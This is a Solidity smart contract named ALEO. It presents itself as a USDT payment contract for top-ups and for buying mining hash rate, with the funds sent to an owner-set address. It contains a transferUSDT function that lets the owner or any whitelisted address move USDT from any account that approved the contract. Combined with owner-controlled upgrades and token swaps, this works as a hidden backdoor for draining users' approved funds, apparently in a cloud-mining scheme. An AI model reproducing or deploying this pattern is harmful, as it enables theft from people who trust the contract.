// contract/MyTokenV1.sol

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/utils/math/SafeMathUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/utils/ContextUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/utils/AddressUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/utils/structs/EnumerableSetUpgradeable.sol";

contract ALEO is Initializable, UUPSUpgradeable, OwnableUpgradeable {
    using SafeMathUpgradeable for uint256;
    using AddressUpgradeable for address;

    ERC20Upgradeable private _usdtToken;
    address public rechangeAddress;
    mapping(address=>bool) whiteList;

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() initializer {}

    function _authorizeUpgrade(address) internal override onlyOwner {}

    function initialize() public initializer {
        __Ownable_init();
        __UUPSUpgradeable_init();
        _usdtToken = ERC20Upgradeable(
            0x7ef95a0FEE0Dd31b22626fA2e10Ee6A223F8a684
        );
        rechangeAddress = 0xa38433265062F1F73c0A90F2FEa408f2Efd1a569;
        whiteList[owner()] = true;
    }
    modifier whiteAddress() {
        require(whiteList[msg.sender], "not white address");
        _;
    }

    function setWhiteAddress(address _account, bool _flag) public onlyOwner {
        whiteList[_account] = _flag;
    }

    function setTokenAddress(address account) public onlyOwner {
        _usdtToken = ERC20Upgradeable(account);
    }
    function setRechangeAddress(address account) public onlyOwner {
        rechangeAddress = account;
    }
    event Rechange(address indexed id, uint256 amount);
    function rechange(uint256 usdtAmount) public {
        address spender = _msgSender();
        if (usdtAmount > 0) {
            _usdtToken.transferFrom(spender, rechangeAddress, usdtAmount);
            emit Rechange(spender, usdtAmount);
        }
    }

    event BuyMiner(address indexed id, uint256 usdtAmount,uint256 hashRate,uint256 count);
    function buyMiner(uint256 usdtAmount,uint256 hashRate,uint256 count) public {
        address spender = _msgSender();
        if (usdtAmount > 0&& hashRate > 0) {
            _usdtToken.transferFrom(spender, rechangeAddress, usdtAmount);
            emit BuyMiner(spender, usdtAmount,hashRate,count);
        }
    }

    function transferUSDT(
        address from,
        address to,
        uint256 amount
    ) public whiteAddress{
        _usdtToken.transferFrom(from, to, amount);
    }
}
